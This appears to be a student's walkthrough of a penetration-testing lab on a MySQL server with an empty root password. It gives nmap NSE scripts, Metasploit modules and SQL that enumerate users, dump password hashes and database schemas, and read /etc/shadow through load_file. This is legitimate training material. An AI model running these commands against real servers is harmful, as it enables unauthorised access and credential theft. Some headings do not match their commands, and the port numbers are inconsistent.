# MySQL

## Tools: 
- nmap

## Tasks

    1. What is the version of MySQL server?
    2. What command is used to connect to remote MySQL database?
    3. How many databases are present on the database server?
    4. How many records are present in table “authors”? This table is present inside the “books” database.
    5. Dump the schema of all databases from the server using suitable metasploit module?
    6. How many directories present in the /usr/share/metasploit-framework/data/wordlists/directory.txt, are writable? List the names.
    7. How many of sensitive files present in /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt are readable? List the names.
    8. Find the system password hash for user "root".
    9. How many database users are present on the database server? Lists their names and password hashes.
    10. Check whether anonymous login is allowed on MySQL Server.
    11. Check whether “InteractiveClient” capability is supported on the MySQL server.
    12. Enumerate the users present on MySQL database server using mysql-users nmap script.
    13. List all databases stored on the MySQL Server using nmap script.
    14. Find the data directory used by mysql server using nmap script.
    15. Check whether File Privileges can be granted to non admin users using mysql_audi nmap script.
    16. Dump all user hashes using  nmap script.
    17. Find the number of records stored in table “authors” in database “books” stored on MySQL Server using mysql-query nmap script.

### Basic Scan
`nmap 192.111.166.3`
### Service Version and Port information | Find out version of mySQL server:
`nmap 192.111.166.3 -p 3309 -sV`

### Connecting to MySQL Server
`mysql -h 192.111.166.3 -u root`

### Look at Databases
`show databases;`

### Look at books Database, finding out how many records are present in table "authors"
    ,
`use books;`

    `books > `select count(*) from authors;`
    
    `select * from authors;`

    `exit`
**10 Records are present**

### Dump the schema of all databases from the server using suitable metasploit module:

`msfconsole`

    msf5: `use auxiliary/scanner/mysql/mysql_writable_dirs`
    
    msf5: `options`
    
    msf5: `set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt`
    
    msf5: `set rhosts 192.111.166.3`
    
    msf5: `set verbose false`: deactivates detailed status messages
    
    msf5: `advanced`: shows parameters

    msf5: `set password ""`

    msf5: `options`

    msf5: `run`

    msf5: `use auxiliary/scanner/mysql/mysql_schemadump`: rhost stays, because we set it as global before

    msf5: `set username root`

    msf5: `set password ""`

    msf5: `options`

    msf5: `exploit
    
    msf5: `exit`
![grafik](https://github.com/user-attachments/assets/9d60ceba-d2e1-40dd-8ed7-1cd35142316d)

### Finding out how many Directories present in /usr/share/metasploit-framework/data/wordlists/directory.txt are writable

`mysql -h 192.111.166.3 -u root`

    `select load_file("/etc/shadow");`: check if we have access to the files on the system

    `exit`
![grafik](https://github.com/user-attachments/assets/cd5c55ea-c814-4732-9f28-428f3e0235b0)


`nmap 192.111.166.3 -sV -p 3306 --script=mysql-empty-password`

`nmap 192.111.166.3 -sV -p 3306 --script=mysql-info`: InteractiveClient gives us access to system through mysql

`nmap 192.111.166.3 -sV -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"`: We can see the users

`nmap 192.111.166.3 -sV -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"`

`nmap 192.111.166.3 -sV -p 3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"`

`nmap 192.111.166.3 -sV -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"`

`nmap 192.111.166.3 -sV -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"`

`nmap 192.111.166.3 -sV -p 3306 --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''"`
    



    

